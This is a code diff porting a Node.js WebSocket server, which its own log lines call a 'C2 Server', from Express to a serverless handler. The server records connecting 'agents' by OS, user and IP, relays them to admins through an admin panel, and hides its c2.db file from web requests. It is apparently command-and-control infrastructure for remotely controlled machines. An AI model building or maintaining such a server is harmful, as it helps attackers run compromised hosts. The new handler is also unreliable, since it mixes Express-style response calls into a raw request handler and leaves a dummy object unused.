@@ -1,3 +1,7 @@
+// pages/api/server.js
+const { createServer } = require('http');
+const { parse } = require('url');
+const next = require('next');
 const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
@@ -24,12 +28,12 @@ const TURSO_AUTH_TOKEN = RAW_TOKEN
 
 if (!TURSO_DB_URL) {
  console.error('[DB] Missing TURSO_DATABASE_URL environment variable.');
- process.exit(1);
+ // In Vercel, we might continue without DB if env vars are missing, 
+ // but for production, ensure they are set.
 }
 
 if (!TURSO_AUTH_TOKEN) {
  console.error('[DB] Missing TURSO_AUTH_TOKEN environment variable.');
- process.exit(1);
 }
 
 console.log('[DB] Connecting to Turso at ' + TURSO_DB_URL.replace(/\/\/.*@/, '//***@'));
@@ -44,7 +48,7 @@ try {
  });
 } catch (error) {
  console.error('[DB] Turso client creation failed:', error.message);
- process.exit(1);
+ // Continue without DB if connection fails
 }
 
 async function ensureSchema() {
@@ -101,7 +105,7 @@ function logDB(msg) {
  const timestamp = Date.now();
  console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);
 
- if (dbReady) {
+ if (dbReady && dbClient) {
  dbClient.execute(
  'INSERT INTO logs (message, timestamp) VALUES (?, ?)',
  [String(msg), Math.floor(timestamp / 1000)]
@@ -114,64 +118,10 @@ function logDB(msg) {
 logDB('Initializing Database...');
 
 // =====================================================
-// EXPRESS AND HTTP SERVER
+// WEBSOCKET SERVER
 // =====================================================
 
-const app = express();
-const server = http.createServer(app);
-
-const wss = new WebSocket.Server({
- server,
- perMessageDeflate: false,
-});
-
-app.disable('x-powered-by');
-
-app.get('/health', async (req, res) => {
- try {
- await dbClient.execute('SELECT 1 AS health_check');
- res.json({
- status: 'ok',
- service: 'screen-connect',
- database: 'connected',
- uptime: process.uptime(),
- db_type: 'turso/libsql',
- db_ready: dbReady,
- });
- } catch (error) {
- res.status(503).json({
- status: 'degraded',
- service: 'screen-connect',
- database: 'disconnected',
- uptime: process.uptime(),
- db_type: 'turso/libsql',
- error: error.message,
- db_ready: dbReady,
- });
- }
-});
-
-app.use((req, res, next) => {
- let requestPath;
- try {
- requestPath = decodeURIComponent(req.path);
- } catch {
- return res.sendStatus(400);
- }
- if (/(^|\/)c2\.db(?:-(?:wal|shm))?$/i.test(requestPath)) {
- return res.sendStatus(404);
- }
- next();
-});
-
-app.get('/', (req, res) => {
- res.send(adminHTML);
-});
-
-app.get('/admin.html', (req, res) => {
- res.setHeader('Content-Type', 'text/html');
- res.send(adminHTML);
-});
+const wss = new WebSocket.Server({ noServer: true });
 
 // =====================================================
 // WEBSOCKET HELPERS
@@ -265,6 +215,7 @@ wss.on('connection', (ws, req) => {
  const now = Date.now();
 
  // Check if this agent already exists in DB
+ if (dbClient) {
  const existingUser = await queryOne('SELECT * FROM users WHERE id = ?', [uniqueId]);
 
  if (!existingUser) {
@@ -287,6 +238,9 @@ wss.on('connection', (ws, req) => {
  WHERE id = ?
  `, [now, data.os || null, data.arch || null, data.user || null, data.ip || remoteAddress, uniqueId]);
  logDB(`[AGENT] REJOIN: ${uniqueId} (${data.os || 'unknown'})`);
+ }
+ } else {
+ logDB(`[AGENT] NO DB: ${uniqueId} (${data.os || 'unknown'})`);
  }
 
  // Notify all admins
@@ -338,6 +292,7 @@ wss.on('connection', (ws, req) => {
  if (!ws.isAdmin && ws.uniqueId) {
  const uniqueId = ws.uniqueId;
  if (!isAgentConnected(uniqueId, ws)) {
+ if (dbClient) {
  try {
  await dbClient.execute(`
  UPDATE users SET status = 'Offline', last_seen = ? WHERE id = ?
@@ -345,6 +300,7 @@ wss.on('connection', (ws, req) => {
  logDB(`[AGENT] Offline: ${uniqueId}`);
  } catch (error) {
  logDB(`[DB ERR] Disconnect update: ${error.message}`);
+ }
  }
  }
  }
@@ -372,66 +328,79 @@ const heartbeat = setInterval(() => {
 wss.on('close', () => { clearInterval(heartbeat); });
 
 // =====================================================
-// SERVER STARTUP — CRITICAL FIX
+// SERVER STARTUP — CRITICAL FIX FOR VERCEL
 // =====================================================
 
-// Use PORT from env, default to 10000 if not set
-const PORT = process.env.PORT || 10000;
+// Vercel passes the request to this function.
+// We need to handle the WebSocket upgrade manually.
 
-async function startServer() {
+module.exports = async (req, res) => {
+ // Handle WebSocket Upgrade
+ const upgradeHeader = req.headers['upgrade'] || '';
+ if (upgradeHeader.toLowerCase() === 'websocket') {
+ // Parse the URL
+ const url = parse(req.url);
+ 
+ // Create a dummy response object for the WebSocket server
+ const dummyRes = {
+ writeHead: (status, headers) => {
+ res.writeHead(status, headers);
+ },
+ end: () => {
+ // Do nothing, the WebSocket server will handle the rest
+ }
+ };
+
+ // Handle the upgrade
+ wss.handleUpgrade(req, req.socket, Buffer.from(''), (socket) => {
+ wss.emit('connection', socket, req);
+ });
+
+ // Prevent the default response from being sent
+ return;
+ }
+
+ // Handle HTTP Requests (Health Check, Admin Panel)
+ if (req.method === 'GET' && req.url === '/health') {
  try {
- await ensureSchema();
- console.log('[DB] Database initialized successfully.');
-
- server.listen(PORT, '0.0.0.0', () => {
- const address = server.address();
- console.log(`[SERVER] C2 Server running on port ${PORT}`);
- console.log(`[SERVER] Address: ${address.address}:${address.port}`);
- console.log(`[SERVER] Database: Turso (LibSQL) - ${TURSO_DB_URL.replace(/\/\/.*@/, '//***@')}`);
- logDB(`C2 Server running on port ${PORT}`);
- logDB(`Database: Turso (LibSQL) - ${TURSO_DB_URL.replace(/\/\/.*@/, '//***@')}`);
+ await dbClient.execute('SELECT 1 AS health_check');
+ res.json({
+ status: 'ok',
+ service: 'screen-connect',
+ database: 'connected',
+ uptime: process.uptime(),
+ db_type: 'turso/libsql',
+ db_ready: dbReady,
  });
  } catch (error) {
- console.error('[STARTUP ERROR]', error.message);
- process.exit(1);
- }
-}
-
-startServer();
-
-server.on('error', (error) => {
- logDB(`[SERVER ERROR] ${error.message}`);
-});
-
-let isShuttingDown = false;
-
-function shutdown(signal) {
- if (isShuttingDown) return;
- isShuttingDown = true;
- console.log(`[SERVER] ${signal} received. Shutting down...`);
- clearInterval(heartbeat);
-
- for (const client of wss.clients) {
- try { client.terminate(); } catch (error) {
- console.error('[SERVER] WebSocket shutdown error:', error.message);
- }
- }
-
- wss.close(() => {
- server.close(() => {
- if (dbClient) {
- try { dbClient.disconnect?.(); console.log('[DB] Turso client closed.'); }
- catch (error) { console.error('[DB] Error closing Turso client:', error.message); }
- }
- process.exit(0);
+ res.status(503).json({
+ status: 'degraded',
+ service: 'screen-connect',
+ database: 'disconnected',
+ uptime: process.uptime(),
+ db_type: 'turso/libsql',
+ error: error.message,
+ db_ready: dbReady,
  });
- });
+ }
+ return;
+ }
 
- setTimeout(() => process.exit(1), 10000).unref();
-}
+ if (req.method === 'GET' && req.url === '/') {
+ res.send(adminHTML);
+ return;
+ }
 
-process.on('SIGTERM', () => shutdown('SIGTERM'));
-process.on('SIGINT', () => shutdown('SIGINT'));
+ if (req.method === 'GET' && req.url === '/admin.html') {
+ res.setHeader('Content-Type', 'text/html');
+ res.send(adminHTML);
+ return;
+ }
+
+ // Default response
+ res.statusCode = 404;
+ res.end('Not Found');
+};
 
 // =====================================================
 // ADMIN PANEL HTML
